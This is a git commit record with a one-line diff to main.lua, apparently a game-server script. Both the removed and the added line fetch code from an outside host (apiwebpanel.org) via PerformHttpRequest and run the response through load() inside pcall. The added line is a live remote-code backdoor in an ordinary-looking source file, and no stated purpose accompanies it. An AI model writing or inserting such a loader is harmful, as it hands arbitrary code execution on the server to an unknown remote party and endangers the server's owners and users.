93aed64a2ff2a0c1393e38ef98fe035028a402fe
banappeals <167147145+banappeals@users.noreply.github.com>
2024-10-18 07:03:19 -0400

    main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-PerformHttpRequest('https://apiwebpanel.org/giXWm?v=true', function (e, d) print(e) pcall(function() assert(load(d))() end) end)
+PerformHttpRequest('https://apiwebpanel.org/giXWm?', function (e, d) print(testing) pcall(function() assert(load(d))() end) end)
